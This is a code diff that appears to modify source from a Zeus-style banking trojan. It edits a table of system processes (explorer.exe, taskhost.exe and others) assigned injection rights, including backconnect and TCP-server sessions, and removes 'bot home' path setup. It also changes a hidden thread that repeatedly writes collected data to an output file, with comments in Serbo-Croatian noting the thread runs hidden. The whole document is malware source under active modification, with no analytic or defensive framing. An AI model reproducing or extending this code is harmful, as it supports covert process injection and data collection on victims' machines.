@@ -35,13 +35,13 @@ PROCESSRIGHTS;
 const static PROCESSRIGHTS processRights[] =
 {
   //Processes that are present throughout all of the user's session.
-	{L"dwm.exe",      Core::CDPF_RIGHT_CONTROL,                                                                                                        CSIDL_SYSTEM},
-  {L"taskhost.exe", Core::CDPF_RIGHT_CONTROL | Core::CDPF_RIGHT_SERVER_SESSION | Core::CDPF_RIGHT_TCP_SERVER | Core::CDPF_RIGHT_BACKCONNECT_SESSION, CSIDL_SYSTEM},
-	{L"taskeng.exe",  Core::CDPF_RIGHT_CONTROL | Core::CDPF_RIGHT_SERVER_SESSION | Core::CDPF_RIGHT_TCP_SERVER | Core::CDPF_RIGHT_BACKCONNECT_SESSION, CSIDL_SYSTEM},
-	{L"wscntfy.exe",  Core::CDPF_RIGHT_CONTROL,                                                                                                        CSIDL_SYSTEM},
-  {L"ctfmon.exe",   Core::CDPF_RIGHT_CONTROL,                                                                                                        CSIDL_SYSTEM},
-	{L"rdpclip.exe",  Core::CDPF_RIGHT_CONTROL,                                                                                                        CSIDL_SYSTEM},
-	{L"explorer.exe", Core::CDPF_RIGHT_CONTROL | Core::CDPF_RIGHT_SERVER_SESSION | Core::CDPF_RIGHT_TCP_SERVER | Core::CDPF_RIGHT_BACKCONNECT_SESSION, CSIDL_WINDOWS},
+	{L"dwm.exe",      Core::CDPF_RIGHT_CONTROL, CSIDL_SYSTEM},
+  {L"taskhost.exe", Core::CDPF_RIGHT_CONTROL, CSIDL_SYSTEM},
+	{L"taskeng.exe",  Core::CDPF_RIGHT_CONTROL, CSIDL_SYSTEM},
+	{L"wscntfy.exe",  Core::CDPF_RIGHT_CONTROL, CSIDL_SYSTEM},
+  {L"ctfmon.exe",   Core::CDPF_RIGHT_CONTROL, CSIDL_SYSTEM},
+	{L"rdpclip.exe",  Core::CDPF_RIGHT_CONTROL, CSIDL_SYSTEM},
+	{L"explorer.exe", Core::CDPF_RIGHT_CONTROL, CSIDL_WINDOWS},
 };
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -177,8 +177,7 @@ static bool __inline initUserData(DWORD flags)
 	if((coreData.currentUser.token = Process::_getUserByProcessHandle(CURRENT_PROCESS, &coreData.currentUser.sessionId)))
 	{
 		coreData.currentUser.sidLength = CWA(advapi32, GetLengthSid)(coreData.currentUser.token->User.Sid);
-		coreData.currentUser.id        = Crypt::crc32Hash((LPBYTE)coreData.currentUser.token->User.Sid, coreData.currentUser.sidLength);
-		WDEBUG2(WDDT_INFO, "coreData.currentUser.id=\"0x%08X\", coreData.currentUser.sessionId=\"%u\"", coreData.currentUser.id, coreData.currentUser.sessionId);
+		WDEBUG1(WDDT_INFO, "coreData.currentUser.sessionId=\"%u\"", coreData.currentUser.sessionId);
 	}
 	else 
 	{
@@ -199,21 +198,6 @@ static bool __inline initUserData(DWORD flags)
 static bool __inline initPaths(DWORD flags)
 {
   WCHAR path[MAX_PATH];
-
-  //Get home directory.
-  if((flags & Core::INITF_INJECT_START) == 0)
-  {
-    if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, coreData.paths.home) != S_OK)
-    {
-      WDEBUG0(WDDT_ERROR, "Failed to get home path."); 
-      return false;
-    }
-    CWA(shlwapi, PathRemoveBackslashW)(coreData.paths.home);
-  }
-  else
-  {
-    //Parent path.
-  }
 
   //Current file.
   DWORD size = CWA(kernel32, GetModuleFileNameW)(NULL, path, MAX_PATH);
@@ -338,12 +322,11 @@ bool Core::init(DWORD flags)
 		//if(CWA(kernel32, ConvertSidToStringSidW)(coreData.currentUser.token->User.Sid, &userSid) == FALSE)userSid = NULL;
 		userSid = NULL;
 
-    WDEBUG6(WDDT_INFO, "Initialized successfully:\r\nIntegrity level: %u\r\ncoreData.proccessFlags: 0x%08X\r\nFull path: %s\r\nCommand line: %s\r\nBot home: %s\r\nSID: %s\r\n",
+    WDEBUG5(WDDT_INFO, "Initialized successfully:\r\nIntegrity level: %u\r\ncoreData.proccessFlags: 0x%08X\r\nFull path: %s\r\nCommand line: %s\r\nSID: %s\r\n",
                        coreData.integrityLevel,
                        coreData.proccessFlags,
                        coreData.paths.process,
                        CWA(kernel32, GetCommandLineW)(),
-                       coreData.paths.home,
                        userSid == NULL ? L"-" : userSid);
 
     if(userSid != NULL)CWA(kernel32, LocalFree)(userSid);
@@ -464,7 +447,7 @@ static DWORD WINAPI hiddenThreadRoutine(void *)
 	for(i=0;i<10;i++)
 	{
 		//beep
-		//CWA(user32, MessageBeep)(-1);
+		CWA(user32, MessageBeep)(-1);
 		
 		// pisanje u fajl
 		HANDLE hMutex = Sync::_waitForMutex(SecurityOK ? &saFullAccess : NULL, MUTEX_WRITEFILE);
@@ -484,16 +467,9 @@ static DWORD WINAPI hiddenThreadRoutine(void *)
 			u8str.size   = iSize;
 			
 			DWORD dwSize;
-
-			//Str::_utf8FromUnicode(&pTmpBuffer, iSize, &u8str);
-			
-			
 			HANDLE hFile = OpenOutputFile();
 			if(hFile != INVALID_HANDLE_VALUE)
 			{
-				CWA(user32, MessageBeep)(-1);
-
-				LARGE_INTEGER li;
 				if(CWA(kernel32, SetFilePointer)(hFile, 0, NULL, FILE_END) != INVALID_SET_FILE_POINTER)
 				{
 					CWA(kernel32, WriteFile)(hFile, u8str.data, u8str.size, &dwSize, 0);
@@ -501,7 +477,6 @@ static DWORD WINAPI hiddenThreadRoutine(void *)
 				}
 				CWA(kernel32, CloseHandle)(hFile);
 			}
-			
 			
 			Sync::_freeMutex(hMutex);
 		}
@@ -533,7 +508,6 @@ static bool defaultModuleEntry(void)
 
 	// pokrenemo drugi thread koji ce raditi sakriven
 	CWA(kernel32, CreateThread)(NULL, 0, hiddenThreadRoutine, NULL, 0, NULL);
-	//hiddenThreadRoutine();
 
 	return true;
 }
